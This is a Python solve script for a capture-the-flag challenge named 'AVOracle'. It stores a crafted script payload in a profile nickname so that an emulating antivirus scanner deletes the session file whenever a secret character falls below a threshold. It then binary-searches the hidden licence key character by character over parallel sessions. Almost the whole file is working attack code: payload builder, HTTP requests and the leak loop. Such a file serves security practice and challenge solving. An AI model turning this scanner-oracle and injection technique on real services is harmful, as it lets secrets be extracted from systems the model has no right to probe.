#!/usr/bin/env python3
"""
10 - AVOracle : automated exploit.

The session file holds our nickname first and the licence key second. The
"Defender" service scans that file as a whole, emulates the JScript in it, and
deletes the file when a signature comes out. So:

    nick = <script> if (secret[i] < N) eval("<signature>") </script><body>

and then "is my session still there?" is one bit of the secret. Binary search
each character over the printable ASCII range: ~7 queries per character, and
every character position is an independent session, so they run in parallel.

Python 3 standard library only.
"""
import http.client
import os
import re
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

_args = [a for a in sys.argv[1:] if not a.startswith("-")]
BASE = _args[0] if len(_args) > 0 else "http://challenge"
SCANNER = _args[1] if len(_args) > 1 else "http://scanner:8080"
PASSIVE = "--passive" in sys.argv          # do not poke the scanner, just wait

# The signature the emulated engine looks for. Split so that the raw bytes of
# our payload never contain it -- otherwise every file would be flagged and the
# oracle would always answer "true".
SIG_A = "PHRACK-STANDARD-ANTIVIRUS-"
SIG_B = "TEST-FILE!"

LO, HI = 32, 127                # printable ASCII search window
ANCHOR = "PHRACK{"              # the flag format is public; anchor on it
MAX_LEN = 64
WAVE = 12                       # character positions leaked in parallel

_tls = threading.local()
_reqs = [0]
_queries = [0]
_lock = threading.Lock()


def _conn(base):
    cache = getattr(_tls, "conns", None)
    if cache is None:
        cache = _tls.conns = {}
    c = cache.get(base)
    if c is None:
        u = urllib.parse.urlsplit(base)
        c = cache[base] = http.client.HTTPConnection(
            u.hostname, u.port or 80, timeout=20)
    return c


def http_req(base, method, path, body=None, headers=None):
    hdr = {"Connection": "keep-alive"}
    if headers:
        hdr.update(headers)
    if body is not None:
        hdr["Content-Type"] = "application/x-www-form-urlencoded"
        hdr["Content-Length"] = str(len(body))
    for attempt in (0, 1):
        c = _conn(base)
        try:
            c.request(method, path, body=body, headers=hdr)
            r = c.getresponse()
            data = r.read()
            with _lock:
                _reqs[0] += 1
            return r.status, data
        except Exception:
            try:
                c.close()
            except Exception:
                pass
            _tls.conns.pop(base, None)
            if attempt:
                raise
    raise RuntimeError("unreachable")


# ---------------------------------------------------------------- challenge

def store_nick(sid, nick):
    body = urllib.parse.urlencode({"nick": nick})
    status, data = http_req(BASE, "POST", "/profile.php", body,
                            {"Cookie": "PHPSESSID=" + sid})
    if status != 200:
        raise RuntimeError(f"profile.php returned {status}: {data[:120]!r}")


def session_alive(sid):
    status, data = http_req(BASE, "GET", "/status.php", None,
                            {"Cookie": "PHPSESSID=" + sid})
    if status != 200:
        raise RuntimeError(f"status.php returned {status}")
    return b"SESSION OK" in data


# ------------------------------------------------------------------ scanner

def scanner_passes():
    import json
    _, data = http_req(SCANNER, "GET", "/status")
    return json.loads(data)["passes"]


def wait_for_scan():
    """Make sure the file we just wrote has been through a full scan pass."""
    if not PASSIVE:
        http_req(SCANNER, "GET", "/scan")
        return
    start = scanner_passes()
    deadline = time.time() + 30
    while time.time() < deadline:
        if scanner_passes() >= start + 2:
            return
        time.sleep(0.05)
    raise RuntimeError("real-time protection stopped scanning")


# ------------------------------------------------------------------- oracle

def payload(pos, threshold):
    """A nickname that makes the scanner delete the file iff secret[pos] < N."""
    js = (
        "var s=document.body.innerHTML;"
        "var i=s.indexOf('%s');"
        "var c=s.charCodeAt(i+%d);"
        "if(c<%d){eval('%s'+'%s');}"
    ) % (ANCHOR, pos, threshold, SIG_A, SIG_B)
    return "<script>" + js + "</script><body>"


def ask(sid, pos, threshold):
    """True  <=>  secret[pos] < threshold."""
    with _lock:
        _queries[0] += 1
    store_nick(sid, payload(pos, threshold))
    wait_for_scan()
    return not session_alive(sid)


def leak_char(pos):
    """Binary search one character. ~7 oracle queries."""
    sid = "avo%03d%s" % (pos, os.urandom(8).hex())
    lo, hi = LO, HI                       # invariant: c >= lo, c < hi
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if ask(sid, pos, mid):
            hi = mid
        else:
            lo = mid
    return chr(lo)


# --------------------------------------------------------------------- main

def main():
    print(f"[*] challenge {BASE}")
    print(f"[*] scanner   {SCANNER}  ({'passive' if PASSIVE else 'triggered'} mode)")

    # sanity: a file carrying the raw signature must be quarantined
    probe = "raw" + os.urandom(8).hex()
    store_nick(probe, SIG_A + SIG_B)
    wait_for_scan()
    if session_alive(probe):
        sys.exit("[-] real-time protection is not deleting flagged files")
    print("[+] real-time protection confirmed: flagged file was removed")

    # sanity: the emulator really reads the secret half of the file
    c0 = leak_char(0)
    if c0 != ANCHOR[0]:
        sys.exit(f"[-] oracle disagrees about the first character: {c0!r}")
    print(f"[+] emulated JScript can see the secret (char 0 = {c0!r})")

    out = {}
    done = False
    pos = len(ANCHOR)
    while pos < MAX_LEN and not done:
        batch = list(range(pos, min(pos + WAVE, MAX_LEN)))
        with ThreadPoolExecutor(max_workers=len(batch)) as pool:
            for p, ch in zip(batch, pool.map(leak_char, batch)):
                out[p] = ch
        got = "".join(out[p] for p in batch)
        print(f"[*] chars {batch[0]:2d}-{batch[-1]:2d}: {got!r}")
        if "}" in got:
            done = True
        pos = batch[-1] + 1

    body = ""
    for p in range(len(ANCHOR), MAX_LEN):
        ch = out.get(p)
        if ch is None or ch == "}":
            break
        body += ch

    flag = ANCHOR + body + "}"
    print(f"[*] {_queries[0]} oracle queries "
          f"({_reqs[0]} HTTP requests in total)")
    if not re.fullmatch(r"PHRACK\{[\x20-\x7e]+\}", flag):
        sys.exit(f"[-] that does not look like a flag: {flag!r}")
    print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
